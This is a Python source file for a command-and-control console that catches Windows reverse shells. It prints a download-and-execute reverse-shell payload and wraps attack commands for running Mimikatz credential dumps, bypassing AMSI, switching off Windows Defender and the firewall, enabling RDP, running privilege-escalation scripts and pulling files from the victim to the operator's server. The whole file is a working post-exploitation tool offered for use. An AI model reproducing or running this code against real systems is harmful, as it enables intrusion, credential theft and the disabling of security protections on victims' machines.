# /bin/python3
import os
import signal
import socket
from datetime import datetime
import netifaces as ni

BUFFER_SIZE = 65535
SERVER_PORT = 8000

COMMANDS = {'help': ['Shows this help'],
            'create <interface> <lport>': ['Create new session listening'],
            'list': ['Lists connected clients'],
            'select <session>': ['Selects a session by its index. Takes index as a parameter'],
            'delete <session>': ['Delete a valid session'],
            'back': ['Exit session without killing'],
            'exit': ['Exit program and kill all session'],
            }

COMMANDS_SHELL = {'mimikatz': ['Powershell mimikatz in memory. If you enter mimikatz without arguments, you can use mimikatz manually'
                               ' with Invoke-Mimikatz -Command <mimikatz_command>. Also, you can enter an argument of this list:'
                               ' debug, lsass, lsa, sam, tickets'],

                  'upload <path_source> <path_dest>': ['Upload file from source to destination'],
                  'download <path_source>': ['Download file from victim machine'],

                  'winpeas': ['Run winpeas bat script and write into a file called resultPeas (alfa)'],
                  'powerup': ['Run PowerUp powershell script'],
                  'wesng': ['Run windows exploit suggester in order to enumerate kernel exploits'],
                  'ikeext': ['Run Ikeext powershell script'],

                  'powerview': ['Invoke PowerView'],
                  'portscan': ['Invoke port scanner. Once you invoke itm you can call the function Invoke-Portscan and use parameters like:'
                               ' -Hosts, -HostFile, -Ports, -PortsFile, -TopPorts, -ExcludedPorts, -Threads, -T'],

                  'portfw <listen_ip> <listen_port> <redirect_ip> <redirect_port>': ['Port forwarding'],

                  'sudo <user> <password> <command>': ['Execute command as a differente user'],
                  'ascheck': ['Check if current user is authority system'],

                  'wdoff': ['Disable real time protection windows defender'],
                  'wdon': ['Enable real time protection windows defender'],
                  'wdrule <program>': ['Add windows defender rule to a program'],
                  'fwoff': ['Disable windows firewall'],
                  'fwon': ['Enable windows firewall'],

                  'bpamsi': ['Bypass amsi'],

                  'enablerdp': ['Enable rdp and create rule in firewall'],
                  }


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class Listener:
    __lhost: str
    __lport: str
    __rhost: str
    __rport: str
    __session: int

    def __init__(self, interface, lport, session):
        try:
            ni.ifaddresses(interface)
            ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
            self.__lhost = ip
            self.__lport = lport
            self.__rhost = ""
            self.__rport = ""
            self.__session = session
        except ValueError:
            print("You must specify a valid interface name.")

    def rhost(self):
        return self.__rhost

    def rport(self):
        return self.__rport

    def lhost(self):
        return self.__lhost

    def lport(self):
        return self.__lport

    def session(self):
        return self.__session

    def print_pwd(self):
        self.__client_socket.send(b"pwd")
        try:
            results = self.__client_socket.recv(BUFFER_SIZE).decode("utf-8")
        except:
            results = self.__client_socket.recv(BUFFER_SIZE).decode("windows-1252")
        print(results + f"(Session {self.__session}): ", end='')

    def print_rev(self):
        str_bypass = f"IEX (curl \"http://{self.__lhost}:{SERVER_PORT}/scripts/Invoke-AlokS-AvBypass.txt\").Content; Invoke-AlokS-AvBypass;"
        str_reverse = f"IEX (curl \"http://{self.__lhost}:{SERVER_PORT}/scripts/ReverseShell.txt\").Content;" \
                      f" ReverseShell {self.__lhost} {self.__lport}"

        print(f"\nYour payload is: \n{str_bypass}{str_reverse}\n")

    def createConection(self):
        try:
            self.print_rev()
            self.__s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.__s.bind((self.__lhost, self.__lport))
            self.__s.listen(5)
            print(f"Listening as {self.__lhost}:{self.__lport} ...")

            self.__client_socket, client_address = self.__s.accept()
            print(f"{client_address[0]}:{client_address[1]} Connected!")

            self.__rhost = client_address[0]
            self.__rport = client_address[1]

            self.executeCommand(b"pwd")
            return True
        except:
            print("Problem with socket")
            return False

    def executeCommand(self, command: bytes):
        self.__client_socket.send(command)
        try:
            results = self.recv_all().decode("utf8") + "\n"
        except:
            results = self.recv_all().decode("windows-1252")
        print(results + f"(Session {self.__session}): ", end='')
        return results

    def recv_all(self) -> bytes:
        buffer: bytes = self.__client_socket.recv(BUFFER_SIZE)
        result: bytes = buffer
        while buffer.__len__() >= BUFFER_SIZE:
            buffer = self.__client_socket.recv(BUFFER_SIZE)
            result += buffer
        return result

    def killSession(self):
        self.__client_socket.close()
        self.__s.close()


def def_handler(sig, frame):
    print("\n[+] exit para salir")


def print_session_list(list_session: list):
    for i in list_session:
        print(
            f"Session: {i.session()} | RHOST: {i.rhost()} | RPORT: {i.rport()} | LHOST: {i.lhost()} | LPORT: {i.lport()}")


def print_help():
    print(f"{bcolors.FAIL}------------------------------- Menu commands --------------------------------")
    print()
    for cmd, v in COMMANDS.items():
        print(f"{bcolors.HEADER}{cmd}: {bcolors.ENDC}{v[0]}")
    print()
    print(f"{bcolors.FAIL}-------------------- Commands that need a valid session ----------------------")
    print()
    for cmd, v in COMMANDS_SHELL.items():
        print(f"{bcolors.HEADER}{cmd}: {bcolors.ENDC}{v[0]}")
    print()
    return


def existSession(list_session: list, session: int):
    ret = -1
    for i in list_session:
        if i.session() == session:
            ret = i
            break
    return ret


def create_session(commandlower: list, session: int, list_session: list):
    if len(commandlower) == 3:
        if len(list_session) == 0:
            ses = 0
        else:
            ses = list_session[len(list_session) - 1].session() + 1

        l = Listener(commandlower[1], int(commandlower[2]), ses)
        if l.createConection():
            list_session.append(l)
            session = ses

    else:
        print("Syntax error")
    return session


def select_session(commandlower: list, list_session: list, session: int):
    if len(commandlower) == 2:
        c = int(commandlower[1])
        if existSession(list_session=list_session, session=c) != -1:
            if len(commandlower) == 2:
                session = c
            else:
                print("Syntax error")
        else:
            print("Session does not exist")

    return session


def delete_session(commandlower: list, session: int, list_session: list):
    if len(commandlower) == 2:
        c = int(commandlower[1])
        if existSession(list_session=list_session, session=c) != -1:
            if len(commandlower) == 2:
                list_session[c].killSession()
                del list_session[c]
                if session == c:
                    session = -1
            else:
                print("Syntax error")
        else:
            print("Session does not exist")

    return session


def execute_command(command: bytes, session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        ret = ses.executeCommand(command)
    else:
        print("Please select a valid session")
        ret = -1
    return ret


def mimikatz_funtion(argument: str, session: Listener):
    command_mimikatz = ""
    if argument == "debug":
        command_mimikatz = "Invoke-Mimikatz -Command privilege::debug"
    elif argument == "lsass":
        command_mimikatz = "Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;"
    elif argument == "tickets":
        command_mimikatz = "Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -Command SEKURLSA::Tickets;"
    elif argument == "lsa":
        command_mimikatz = "Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -Command lsadump::lsa"
    elif argument == "sam":
        command_mimikatz = "Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -Command lsadump::lsa"

    return command_mimikatz


def mimikatz(command: list, session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        command_mimikatz = f"IEX (curl 'http://{ses.lhost()}:{SERVER_PORT}/scripts/Invoke-Mimikatz.txt').Content;"
        if len(command) == 2:
            command_mimikatz += mimikatz_funtion(command[1].lower(), ses)
        execute_command(command_mimikatz.encode(), ses.session(), list_session)
    else:
        print("Please select a valid session")


def ascheck(session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        command = b"function Test-Administrator{$user = [Security.Principal.WindowsIdentity]::" \
                  b"GetCurrent();(New-Object Security.Principal.WindowsPrincipal $user)." \
                  b"IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)}; Test-Administrator  "
        execute_command(command, ses.session(), list_session)
    else:
        print("Please select a valid session")


def wdef(session: int, list_session: list, dec: str):
    ses = existSession(list_session, session)
    if ses != -1:
        command = f"Set-MpPreference -DisableRealtimeMonitoring ${dec}"
        execute_command(command.encode(), ses.session(), list_session)
    else:
        print("Please select a valid session")


def wdrule(command: list, session: int, list_session: list):
    if len(command) == 2:
        ses = existSession(list_session, session)
        if ses != -1:
            command = f"Set-MpPreference -ExclusionProcess {command[1].lower()}"
            execute_command(command.encode(), ses.session(), list_session)
        else:
            print("Please select a valid session")


def fw(session: int, list_session: list, dec: str):
    ses = existSession(list_session, session)
    if ses != -1:
        command = f"netsh advfirewall set allprofiles state {dec}"
        execute_command(command.encode(), ses.session(), list_session)
    else:
        print("Please select a valid session")


def portfw(command: list, session: int, list_session: list):
    if len(command) == 5:
        ses = existSession(list_session, session)
        if ses != -1:
            lip = command[1]
            lport = command[2]
            rip = command[3]
            rport = command[4]
            command = f"netsh interface portproxy add v4tov4 listenport={lip} listenaddress={lport} " \
                      f"connectport={rip} connectaddress={rport}"
            execute_command(command.encode(), ses.session(), list_session)
        else:
            print("Please select a valid session")


def enablerdp(session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        command = f"Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name \"fDenyTSConnections\" -Value 0;" \
                  f" Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\""
        execute_command(command.encode(), ses.session(), list_session)
    else:
        print("Please select a valid session")


def bpamsi(session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        command = f"IEX (New-Object Net.WebClient).DownloadString('http://{ses.lhost()}:{SERVER_PORT}/scripts/" \
                  f"Invoke-AlokS-AvBypass.txt'); Invoke-AlokS-AvBypass"
        execute_command(command.encode(), ses.session(), list_session)
    else:
        print("Please select a valid session")


def powerup(session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        command = f"IEX (New-Object Net.WebClient).DownloadString('http://{ses.lhost()}:{SERVER_PORT}/scripts/" \
                  f"PowerUp.txt'); Invoke-AllChecks"
        result = execute_command(command.encode(), ses.session(), list_session)
        createFileEnum("PowerUp", result, ses.rhost(), "log")
    else:
        print("Please select a valid session")


def ikeext(session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        command = f"IEX (New-Object Net.WebClient).DownloadString('http://{ses.lhost()}:{SERVER_PORT}/scripts/" \
                  f"Ikeext-Privesc.txt'); Invoke-IkeextExploit -Verbose"
        result = execute_command(command.encode(), ses.session(), list_session)
        createFileEnum("Ikeext", result, ses.rhost(), "log")
    else:
        print("Please select a valid session")


def winpeas(session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        command = f"(curl http://{list_session[ses.session()].lhost()}:{SERVER_PORT}/scripts/winPEAS.txt).Content" \
                  f" | cmd /v:on /k > resultpeas"
        result = execute_command(command.encode(), ses.session(), list_session)
        createFileEnum("WinPeas", result, ses.rhost(), "log")
    else:
        print("Please select a valid session")


def wesng(session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        command = f"systeminfo"
        result = execute_command(command.encode(), ses.session(), list_session)
        f = open(f'tmp/info.txt', "w")
        f.write(result)
        f.close()
        now = datetime.now()
        date_time = now.strftime("%m-%d-%Y%H:%M:%S")
        os.system(f"python3 auxiliary/wesng/wes.py tmp/info.txt --definitions auxiliary/wesng/definitions.zip -e > "
                  f"log/wesng{ses.rhost()}{date_time}")
    else:
        print("Please select a valid session")


def powerview(session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        command = f"IEX (New-Object Net.WebClient).DownloadString('http://{ses.lhost()}:{SERVER_PORT}/scripts/" \
                  f"PowerView.txt')"
        execute_command(command.encode(), ses.session(), list_session)
    else:
        print("Please select a valid session")


def portScan(session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        command = f"IEX (New-Object Net.WebClient).DownloadString('http://{ses.lhost()}:{SERVER_PORT}/scripts/" \
                  f"Invoke-Portscan.txt')"
        execute_command(command.encode(), ses.session(), list_session)
    else:
        print("Please select a valid session")


def sudo(commandlower: list, session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        if len(commandlower) >= 4:
            user = commandlower[1]
            passw = commandlower[2]
            str = ""
            for i in range(3, commandlower.__len__()):
                str += commandlower[i] + " "

            command = f"$SecPass = ConvertTo-SecureString '{passw}' -AsPlainText -Force;" \
                      f" $cred = New-Object System.Management.Automation.PSCredential('{user}', $SecPass);" \
                      f"Start-Process -FilePath \"powershell\" -argumentlist \"{str}\" -Credential $cred"
            execute_command(command.encode(), ses.session(), list_session)
        else:
            print("Syntax error")
    else:
        print("Please select a valid session")


def download(commandlower: list, session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        if len(commandlower) == 2:
            source = commandlower[1]
            sourcesplit = commandlower[1].split("\\")
            command = f"$uri=\"http://{ses.lhost()}:{SERVER_PORT}\";$uploadPath=\"{source}\";" \
                      f"$wc = New-Object System.Net.WebClient;$resp = $wc.UploadFile($uri,$uploadPath)"
            execute_command(command.encode(), ses.session(), list_session)
            os.system(f"mv {sourcesplit[-1]} downloads/{sourcesplit[-1]}")
        else:
            print("Syntax error")
    else:
        print("Please select a valid session")


def upload(commandlower: list, session: int, list_session: list):
    ses = existSession(list_session, session)
    if ses != -1:
        if len(commandlower) == 3:
            source = commandlower[1]
            dest = commandlower[2]
            source_split = source.split("/")
            os.system(f"cp {source} tmp/{source_split[-1]}")
            command = f"Invoke-WebRequest http://{ses.lhost()}:{SERVER_PORT}/tmp/{source_split[-1]}" \
                      f" -OutFile {dest}"
            execute_command(command.encode(), ses.session(), list_session)
            os.system(f"rm tmp/{source_split[-1]}")
        else:
            print("Syntax error")
    else:
        print("Please select a valid session")


def createFileEnum(enumName: str, result: str, rhost: str, path: str):
    now = datetime.now()
    date_time = now.strftime("%m-%d-%Y%H:%M:%S")
    f = open(f'{path}/{enumName}&{rhost}&{date_time}', "w")
    f.write(result)
    f.close()


if __name__ == '__main__':
    signal.signal(signal.SIGINT, def_handler)
    os.system("python3 auxiliary/http_server 1>/dev/null 2>/dev/null &")
    os.system("mkdir downloads 1>/dev/null 2>/dev/null")
    os.system("mkdir log 1>/dev/null 2>/dev/null")
    os.system("rm -r tmp 1>/dev/null 2>/dev/null")
    os.system("mkdir tmp 1>/dev/null 2>/dev/null")
    list_session = []
    session = -1
    print_help()

    continuar = True
    while continuar:
        command = input("shell>> ")
        if command != "":
            commandsplit = command.split(" ")

            ####### menu commands ######
            if commandsplit[0].lower() == "create":
                session = create_session(commandlower=commandsplit, session=session, list_session=list_session)
            elif commandsplit[0].lower() == "help":
                print_help()
            elif commandsplit[0].lower() == "list":
                print_session_list(list_session)
            elif commandsplit[0].lower() == "select":
                session = select_session(commandlower=commandsplit, list_session=list_session, session=session)
            elif commandsplit[0].lower() == "back":
                session = -1
            elif commandsplit[0].lower() == "delete":
                session = delete_session(session=session, commandlower=commandsplit, list_session=list_session)
            elif commandsplit[0].lower() == "exit":
                for i in list_session:
                    i.killSession()
                os.system("pkill python3")
                continuar = False

            ####### shell commands ######
            elif commandsplit[0].lower() == "mimikatz":
                mimikatz(session=session, list_session=list_session, command=commandsplit)
            elif commandsplit[0].lower() == "ascheck":
                ascheck(session=session, list_session=list_session)
            elif commandsplit[0].lower() == "wdoff":
                wdef(session=session, list_session=list_session, dec="true")
            elif commandsplit[0].lower() == "wdrule":
                wdrule(command=commandsplit, session=session, list_session=list_session)
            elif commandsplit[0].lower() == "wdon":
                wdef(session=session, list_session=list_session, dec="false")
            elif commandsplit[0].lower() == "fwoff":
                fw(session=session, list_session=list_session, dec="off")
            elif commandsplit[0].lower() == "fwon":
                fw(session=session, list_session=list_session, dec="on")
            elif commandsplit[0].lower() == "portfw":
                portfw(session=session, list_session=list_session, command=commandsplit)
            elif commandsplit[0].lower() == "enablerdp":
                enablerdp(session=session, list_session=list_session)
            elif commandsplit[0].lower() == "bpamsi":
                bpamsi(session=session, list_session=list_session)
            elif commandsplit[0].lower() == "download":
                download(commandlower=commandsplit, session=session, list_session=list_session)
            elif commandsplit[0].lower() == "upload":
                upload(commandlower=commandsplit, session=session, list_session=list_session)
            elif commandsplit[0].lower() == "powerup":
                powerup(session=session, list_session=list_session)
            elif commandsplit[0].lower() == "ikeext":
                ikeext(session=session, list_session=list_session)
            elif commandsplit[0].lower() == "winpeas":
                winpeas(session=session, list_session=list_session)
            elif commandsplit[0].lower() == "wesng":
                wesng(session=session, list_session=list_session)
            elif commandsplit[0].lower() == "powerview":
                powerview(session=session, list_session=list_session)
            elif commandsplit[0].lower() == "portscan":
                portScan(session=session, list_session=list_session)
            elif commandsplit[0].lower() == "sudo":
                sudo(commandlower=commandsplit, session=session, list_session=list_session)
            else:
                execute_command(session=session, command=command.encode(), list_session=list_session)
